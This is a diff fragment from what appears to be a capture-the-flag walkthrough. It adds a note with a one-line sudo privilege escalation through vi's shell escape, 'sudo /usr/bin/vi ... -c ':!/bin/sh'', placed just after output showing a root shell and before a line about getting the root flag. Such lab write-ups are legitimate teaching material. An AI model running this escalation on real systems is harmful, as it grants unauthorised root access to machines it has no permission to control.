@@ -217,4 +217,6 @@ id
 uid=0(root) gid=0(root) groups=0(root)
 ```
 
+Note: you can also run `sudo /usr/bin/vi /var/www/html/test -c ':!/bin/sh'` directly!
+
 Now you can get the root flag!
